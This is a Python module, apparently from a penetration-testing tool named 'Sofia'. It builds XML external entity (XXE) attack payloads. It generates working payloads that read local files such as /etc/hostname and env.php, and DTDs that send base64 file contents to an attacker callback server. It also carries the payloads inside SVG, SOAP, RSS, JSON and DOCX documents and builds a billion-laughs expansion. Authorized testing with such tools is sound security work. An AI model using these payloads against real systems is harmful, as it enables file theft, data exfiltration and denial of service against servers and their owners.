"""XXE payload library.

Each payload kind has a builder that produces a full XML (or multipart/SVG/RSS/
DOCX/SOAP) document given:

  ctx: dict with keys
    - cid      : canary id (uuid hex[:10])
    - oob_base : attacker callback base, e.g. https://x.trycloudflare.com
    - target   : file path to exfiltrate (env.php etc.)
    - dtd_url  : full URL to attacker DTD
    - levels   : entity expansion levels (billion laughs)
    - width    : entity expansion width
    - body     : optional benign XML body to wrap

Sofia only ever generates payloads against user-authorized targets.
"""

from __future__ import annotations

import base64
import io
import zipfile
from typing import Callable, Dict, List, Optional

import xml.etree.ElementTree as ET  # only used to *build* benign OOXML parts

_XML_DECL = '<?xml version="1.0" encoding="UTF-8"?>'


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------

def _esc(text: str) -> str:
    return (text.replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))


def _param_entity_http_exfil(cid: str, oob_base: str, target: str) -> str:
    """DTD content served by the attacker: OOB file exfil via php filter base64."""
    host = _esc(oob_base.rstrip("/"))
    fname = _esc(target.replace("'", "&apos;"))
    return (
        f'<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={fname}">\n'
        f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{host}/x/{cid}?d=%file;\'>">\n'
        f'%eval;\n%exfil;\n'
    )


def _dtd_generic(cid: str, oob_base: str, target: str) -> str:
    """Fallback DTD (non-php targets) - path fallback to /etc/passwd handled by caller."""
    host = _esc(oob_base.rstrip("/"))
    return (
        f'<!ENTITY % file SYSTEM "file://{_esc(target)}">\n'
        f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{host}/x/{cid}?d=%file;\'>">\n'
        f'%eval;\n%exfil;\n'
    )


# --------------------------------------------------------------------------
# builders
# --------------------------------------------------------------------------

def build_internal_entity(ctx: Dict) -> str:
    """Direct internal entity echo (classic XXE, response reflected)."""
    cid = ctx.get("cid", "x")
    val = f"SOFIA[{cid}]"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>"
        f"<r>&xxe;{val}</r>"
    )


def build_oob_probe_http(ctx: Dict) -> str:
    """External entity referencing an HTTP URL -> OOB probe hit."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<r>&xxe;</r>"
    )


def build_oob_parameter_entity(ctx: Dict) -> str:
    """Parameter entity loading attacker DTD from OOB server."""
    cid = ctx.get("cid", "x")
    dtd = ctx.get("dtd_url", "")
    if not dtd:
        dtd = f"{ctx.get('oob_base', 'http://127.0.0.1:17888')}/dtd/{cid}.dtd"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % ext SYSTEM \"{dtd}\"> %ext;]>"
        f"<r>SOFIA[{cid}]</r>"
    )


def build_oob_file_exfil(ctx: Dict) -> str:
    """Parameter-entity chain that fetches attacker DTD which exfiltrates a file."""
    cid = ctx.get("cid", "x")
    dtd = ctx.get("dtd_url", "")
    if not dtd:
        dtd = f"{ctx.get('oob_base', 'http://127.0.0.1:17888')}/dtd/{cid}.dtd"
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % ext SYSTEM \"{dtd}\"> %ext;]>"
        f"<r>SOFIA[{cid}]</r>"
    )


def build_error_based(ctx: Dict) -> str:
    """Error-based XXE: force parser error that includes file content."""
    cid = ctx.get("cid", "x")
    target = ctx.get("target", "file:///etc/hostname")
    return (
        f"{_XML_DECL}\n<!DOCTYPE r [<!ENTITY % file SYSTEM \"{target}\">"
        f"<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">"
        f"%eval;]>\n<r>SOFIA[{cid}]</r>"
    )


def build_xinclude(ctx: Dict) -> str:
    """XInclude (only works when XInclude processing enabled)."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<r xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
        f"<xi:include parse=\"text\" href=\"{url}\"/></r>"
    )


def build_xslt(ctx: Dict) -> str:
    """XSLT payload - document() to read local files, rendered via output."""
    cid = ctx.get("cid", "x")
    target = ctx.get("target", "file:///etc/hostname")
    return (
        f"{_XML_DECL}\n<?xml-stylesheet type=\"text/xsl\" href=\"#s\"?>"
        f"<r>SOFIA[{cid}]</r>\n<xsl:stylesheet id=\"s\" version=\"1.0\" "
        f"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">"
        f"<xsl:template match=\"/\"><xsl:copy-of select=\"document('{target}')\"/>"
        f"</xsl:template></xsl:stylesheet>"
    )


def build_entity_expansion(ctx: Dict) -> str:
    """Billion laughs - bounded by risk tier (levels/width from ctx)."""
    cid = ctx.get("cid", "x")
    levels = int(ctx.get("levels", 6))
    width = int(ctx.get("width", 16))
    parts = [f"{_XML_DECL}\n<!DOCTYPE lolz ["]
    parts.append('<!ENTITY lol "lol">')
    prev = "lol"
    for i in range(1, levels):
        name = f"lol{i}"
        parts.append(f'<!ENTITY {name} "{prev * width}">')
        prev = name
    parts.append(f"]>\n<r>&{prev};</r>")
    return "\n".join(parts)


def build_svg_entity(ctx: Dict) -> str:
    """SVG with external entity (browser/parser dependent)."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\">"
        f"<text x=\"10\" y=\"20\">&xxe;SOFIA[{cid}]</text></svg>"
    )


def build_soap_entity(ctx: Dict) -> str:
    """SOAP envelope containing XXE payload."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">"
        f"<soapenv:Body><req>&xxe;SOFIA[{cid}]</req></soapenv:Body></soapenv:Envelope>"
    )


def build_json_xml_chain(ctx: Dict) -> str:
    """JSON payload whose string field carries XML (for JSON->XML converters)."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    xml = (
        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{url}">]><r>&xxe;SOFIA[{cid}]</r>'
    )
    return f'{{"data": "{xml}", "cid": "{cid}"}}'


def build_rss_entity(ctx: Dict) -> str:
    """RSS feed document with external entity."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    return (
        f"{_XML_DECL}\n<!DOCTYPE rss [<!ENTITY xxe SYSTEM \"{url}\">]>"
        f"<rss version=\"2.0\"><channel><title>&xxe;SOFIA[{cid}]</title>"
        f"<item><link>http://x</link></item></channel></rss>"
    )


def build_docx_upload(ctx: Dict) -> bytes:
    """Minimal OOXML (.docx) zip containing a XXE-carrying document.xml."""
    cid = ctx.get("cid", "x")
    oob = ctx.get("oob_base", "http://127.0.0.1:17888")
    url = f"{oob.rstrip('/')}/probe/{cid}"
    document_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "'
        + url + '">]>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body><w:p><w:r><w:t>&xxe;SOFIA[' + cid + ']</w:t></w:r></w:p></w:body></w:document>'
    )
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/></Relationships>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", rels)
        z.writestr("word/document.xml", document_xml)
    return buf.getvalue()


def build_baseline_xml(ctx: Dict) -> str:
    """Benign XML used for baseline and negative control."""
    cid = ctx.get("cid", "x")
    return f"{_XML_DECL}\n<r>SOFIA[{cid}] benign</r>"


def build_negative_control(ctx: Dict) -> str:
    """Negative control: XML without any entity/DOCTYPE (should not trigger OOB)."""
    cid = ctx.get("cid", "x")
    return f"{_XML_DECL}\n<r>SOFIA[{cid}] control</r>"


# --------------------------------------------------------------------------
# registry
# --------------------------------------------------------------------------

def _ctx_with_defaults(ctx: Dict) -> Dict:
    d = dict(ctx or {})
    d.setdefault("cid", "x")
    d.setdefault("oob_base", "http://127.0.0.1:17888")
    d.setdefault("target", "file:///etc/hostname")
    return d


PAYLOAD_REGISTRY: Dict[str, Dict] = {
    "baseline": {
        "label": "Baseline benign XML",
        "content_type": "application/xml",
        "builder": build_baseline_xml,
        "binary": False,
        "purpose": "baseline",
    },
    "negative_control": {
        "label": "Negative control (no DOCTYPE)",
        "content_type": "application/xml",
        "builder": build_negative_control,
        "binary": False,
        "purpose": "negative_control",
    },
    "internal_entity": {
        "label": "Internal/external entity echo",
        "content_type": "application/xml",
        "builder": build_internal_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "entity",
    },
    "oob_probe_http": {
        "label": "OOB HTTP external entity probe",
        "content_type": "application/xml",
        "builder": build_oob_probe_http,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "oob_parameter_entity": {
        "label": "OOB parameter entity (DTD fetch)",
        "content_type": "application/xml",
        "builder": build_oob_parameter_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "oob_file_exfil": {
        "label": "OOB file exfiltration (env.php targets)",
        "content_type": "application/xml",
        "builder": build_oob_file_exfil,
        "binary": False,
        "purpose": "exfil",
        "capability": "external_entity",
        "requires_oob": True,
        "requires_exfil": True,
    },
    "error_based": {
        "label": "Error-based file read",
        "content_type": "application/xml",
        "builder": build_error_based,
        "binary": False,
        "purpose": "capability",
        "capability": "error_reflection",
    },
    "xinclude": {
        "label": "XInclude",
        "content_type": "application/xml",
        "builder": build_xinclude,
        "binary": False,
        "purpose": "capability",
        "capability": "xinclude",
        "requires_oob": True,
    },
    "xslt": {
        "label": "XSLT document()",
        "content_type": "application/xml",
        "builder": build_xslt,
        "binary": False,
        "purpose": "capability",
        "capability": "xslt",
    },
    "entity_expansion": {
        "label": "Entity expansion (bounded)",
        "content_type": "application/xml",
        "builder": build_entity_expansion,
        "binary": False,
        "purpose": "capability",
        "capability": "resource_limit",
    },
    "svg_entity": {
        "label": "SVG external entity",
        "content_type": "image/svg+xml",
        "builder": build_svg_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "soap_entity": {
        "label": "SOAP envelope XXE",
        "content_type": "text/xml",
        "builder": build_soap_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "json_xml_chain": {
        "label": "JSON->XML chain",
        "content_type": "application/json",
        "builder": build_json_xml_chain,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "rss_entity": {
        "label": "RSS feed external entity",
        "content_type": "application/rss+xml",
        "builder": build_rss_entity,
        "binary": False,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
    "docx_upload": {
        "label": "OOXML .docx with XXE",
        "content_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        "builder": build_docx_upload,
        "binary": True,
        "purpose": "capability",
        "capability": "external_entity",
        "requires_oob": True,
    },
}


def get_payload(kind: str, ctx: Optional[Dict] = None,
                cid: Optional[str] = None,
                oob_base: Optional[str] = None,
                target: Optional[str] = None,
                levels: Optional[int] = None,
                width: Optional[int] = None):
    """Return (kind, content_type, data) for a payload kind."""
    spec = PAYLOAD_REGISTRY.get(kind)
    if not spec:
        raise KeyError(f"unknown payload kind: {kind}")
    full = _ctx_with_defaults(ctx or {})
    if cid:
        full["cid"] = cid
    if oob_base:
        full["oob_base"] = oob_base
    if target:
        full["target"] = target
    if levels is not None:
        full["levels"] = levels
    if width is not None:
        full["width"] = width
    data = spec["builder"](full)
    return kind, spec["content_type"], data


def dtd_payload(cid: str, oob_base: str, target: str, php: bool = True) -> str:
    """Content for the attacker-hosted .dtd endpoint."""
    if php or target.startswith("php://"):
        return _param_entity_http_exfil(cid, oob_base, target)
    return _dtd_generic(cid, oob_base, target)


def payload_kinds() -> List[str]:
    return list(PAYLOAD_REGISTRY.keys())


